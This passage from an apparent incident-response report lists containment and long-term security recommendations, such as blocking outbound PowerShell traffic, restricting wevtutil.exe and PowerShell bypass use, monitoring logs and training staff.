   - Verify and contain any additional compromised systems.
   - Review and possibly reconfigure firewall and proxy rules to block outgoing PowerShell traffic to suspicious external sources.

3. **Long-term Actions**:
   - Audit and restrict the use of admin accounts and the execution of potentially risky commands like `wevtutil.exe` and PowerShell with bypass flags.
   - Ensure regular monitoring and alerting on logs related to security, system changes, and PowerShell activity.
   - Train end-users and administrators on recognizing and reacting to potential security threats."
